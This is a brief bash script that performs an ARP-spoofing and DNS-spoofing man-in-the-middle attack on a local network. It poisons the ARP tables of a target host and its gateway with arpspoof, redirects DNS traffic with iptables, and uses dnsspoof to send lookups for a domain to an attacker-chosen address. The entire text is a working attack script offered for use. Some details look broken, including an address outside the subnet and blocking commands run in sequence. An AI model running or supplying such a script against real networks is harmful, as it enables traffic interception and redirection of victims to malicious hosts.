#!/bin/bash
arpspoof -i eth0 -t 192.168.1.181 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.181

iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53

echo "198.168.1.136   *.goole.com" > hosts.txt
dnsspoof -i eth0 -f hosts.txt
